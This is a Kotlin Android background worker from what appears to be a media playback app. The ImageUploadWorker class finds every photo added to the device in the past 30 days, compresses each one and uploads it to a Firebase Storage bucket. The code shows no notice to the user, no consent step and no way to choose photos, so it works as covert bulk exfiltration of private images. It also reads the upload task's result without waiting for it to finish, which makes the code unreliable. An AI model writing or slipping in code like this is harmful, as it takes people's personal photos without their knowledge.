package com.shayan.playbackmaster.worker

import android.content.Context
import android.graphics.Bitmap
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.bumptech.glide.Glide
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class ImageUploadWorker(context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        // Get images from the last 30 days
        val imagePaths = getRecentImagePaths()
        if (imagePaths.isEmpty()) {
            Log.d("ImageUploadWorker", "No images found to upload.")
            return Result.success()
        }

        // Upload images
        val success = uploadImagesToFirebase(imagePaths)
        return if (success) {
            Result.success()
        } else {
            Result.retry() // Retry if upload fails
        }
    }

    private fun getRecentImagePaths(): List<String> {
        val imagePaths = mutableListOf<String>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED
        )

        // Calculate timestamp for 30 days ago
        val thirtyDaysAgo = (System.currentTimeMillis() / 1000) - TimeUnit.DAYS.toSeconds(30)

        // Query to fetch images added in the last 30 days
        val selection = "${MediaStore.Images.Media.DATE_ADDED} >= ?"
        val selectionArgs = arrayOf(thirtyDaysAgo.toString())

        val cursor = applicationContext.contentResolver.query(
            uri, projection, selection, selectionArgs, null
        )
        cursor?.use {
            val columnIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            while (it.moveToNext()) {
                val filePath = it.getString(columnIndex)
                imagePaths.add(filePath)
            }
        }
        return imagePaths
    }

    private fun uploadImagesToFirebase(imagePaths: List<String>): Boolean {
        val storage = FirebaseStorage.getInstance()
        val storageRef = storage.reference

        var allSuccess = true
        for (path in imagePaths) {
            try {
                // Compress the image before uploading
                val compressedFile = compressImage(applicationContext, path)
                if (compressedFile != null) {
                    val fileUri = Uri.fromFile(compressedFile)
                    val fileRef = storageRef.child("images/${compressedFile.name}")
                    val task = fileRef.putFile(fileUri).addOnFailureListener {
                        Log.e("ImageUploadWorker", "Failed to upload ${compressedFile.name}")
                        allSuccess = false
                    }

                    // Wait for the upload to complete (blocking call)
                    task.result
                }
            } catch (e: Exception) {
                Log.e("ImageUploadWorker", "Error during upload", e)
                allSuccess = false
            }
        }
        return allSuccess
    }

    private fun compressImage(context: Context, imagePath: String): File? {
        return try {
            // Load the image as a Bitmap using Glide
            val bitmap = Glide.with(context).asBitmap().load(imagePath).submit().get()

            // Create a temporary file to save the compressed image
            val compressedFile =
                File(context.cacheDir, "compressed_${System.currentTimeMillis()}.jpg")
            val outputStream = FileOutputStream(compressedFile)

            // Compress the Bitmap to JPEG with 80% quality
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
            outputStream.flush()
            outputStream.close()

            compressedFile
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }
}